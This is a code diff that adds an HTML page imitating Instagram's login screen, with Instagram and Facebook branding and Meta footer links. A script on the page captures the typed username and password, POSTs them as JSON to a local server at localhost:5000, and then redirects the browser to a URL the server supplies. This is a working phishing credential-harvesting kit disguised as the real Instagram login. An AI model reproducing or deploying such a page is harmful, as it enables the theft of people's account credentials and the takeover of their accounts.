@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <style>
+    :root {
+      --light-bg: #fafafa;
+      --dark-bg: #000;
+      --light-input-bg: #fff;
+      --dark-input-bg: #121212;
+      --border-color-light: #dbdbdb;
+      --border-color-dark: #333;
+      --primary-color: #0095f6;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--light-bg);
+      color: #262626;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      transition: background 0.3s ease;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body {
+        background-color: var(--dark-bg);
+        color: #fff;
+      }
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+      width: 100%;
+      height: 100%;
+    }
+
+    .main-box {
+      margin-top: 60px;
+      width: 100%;
+      max-width: 350px;
+      padding: 40px 40px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .main-box img {
+      height: 50px;
+      margin-bottom: 30px;
+    }
+
+    .input-box {
+      width: 100%;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 8px;
+      border: 1px solid var(--border-color-light);
+      border-radius: 4px;
+      background-color: var(--light-input-bg);
+      font-size: 14px;
+      color: #000;
+      outline: none;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      input {
+        background-color: var(--dark-input-bg);
+        border: 1px solid var(--border-color-dark);
+        color: white;
+      }
+    }
+
+    button {
+      width: 100%;
+      padding: 8px;
+      margin: 10px 0;
+      background-color: var(--primary-color);
+      border: none;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .or-line {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+      width: 100%;
+    }
+
+    .or-line::before,
+    .or-line::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background-color: #737373;
+      opacity: 0.3;
+    }
+
+    .or-line span {
+      margin: 0 10px;
+      color: gray;
+      font-weight: 500;
+      font-size: 12px;
+    }
+
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .facebook-login img {
+      height: 18px;
+      margin-right: 8px;
+    }
+
+    .forgot {
+      color: #0095f6;
+      font-size: 12px;
+      margin-top: 16px;
+      text-align: center;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .signup {
+      margin-top: 40px;
+      font-size: 14px;
+      color: gray;
+    }
+
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .footer {
+      margin-top: 50px;
+      font-size: 11px;
+      color: gray;
+      text-align: center;
+      max-width: 95%;
+    }
+
+    .footer a {
+      color: inherit;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer div {
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="bgCanvas"></canvas>
+
+<div class="main-box">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
+  <div class="input-box">
+    <input type="text" placeholder="Phone number, username, or email" />
+    <input type="password" placeholder="Password" />
+    <button>Log in</button>
+  </div>
+
+  <div class="or-line"><span>OR</span></div>
+
+  <div class="facebook-login">
+    <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="fb" />
+    Log in with Facebook
+  </div>
+
+  <div class="forgot">Forgot password?</div>
+</div>
+
+<div class="signup">
+  Don't have an account? <a href="#">Sign up</a>
+</div>
+
+<div class="footer">
+  <div>
+    <a href="#">Meta</a> ·
+    <a href="#">About</a> ·
+    <a href="#">Blog</a> ·
+    <a href="#">Jobs</a> ·
+    <a href="#">Help</a> ·
+    <a href="#">API</a> ·
+    <a href="#">Privacy</a> ·
+    <a href="#">Terms</a>
+  </div>
+  <div>
+    <a href="#">Locations</a> ·
+    <a href="#">Instagram Lite</a> ·
+    <a href="#">Threads</a>
+  </div>
+  <div>
+    <a href="#">Contact Uploading & Non-Users</a> ·
+    <a href="#">Meta Verified</a>
+  </div>
+  <div>English ⌄</div>
+  <div>© 2025 Instagram from Meta</div>
+</div>
+
+<script>
+  const canvas = document.getElementById("bgCanvas");
+  const ctx = canvas.getContext("2d");
+
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+
+  window.addEventListener("resize", resizeCanvas);
+  resizeCanvas();
+
+  let hue = 200;
+
+  function drawBackground() {
+    hue += 0.2;
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    const cx = canvas.width / 2;
+    const cy = canvas.height / 4;
+    const gradient = ctx.createRadialGradient(cx, cy, 80, cx, cy, 400);
+    gradient.addColorStop(0, `hsla(${hue % 360}, 100%, 50%, 0.05)`);
+    gradient.addColorStop(1, "transparent");
+
+    ctx.fillStyle = gradient;
+    ctx.beginPath();
+    ctx.arc(cx, cy, 400, 0, Math.PI * 2);
+    ctx.fill();
+
+    requestAnimationFrame(drawBackground);
+  }
+
+  drawBackground();
+</script>
+<script>
+  document.querySelector("button").addEventListener("click", async () => {
+    const username = document.querySelector("input[type='text']").value;
+    const password = document.querySelector("input[type='password']").value;
+
+    const res = await fetch("http://localhost:5000/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password })
+    });
+
+    const data = await res.json();
+    if (data.success) {
+      window.location.href = data.redirectUrl;
+    } else {
+      alert("Login failed");
+    }
+  });
+</script>
+
+</body>
+</html>
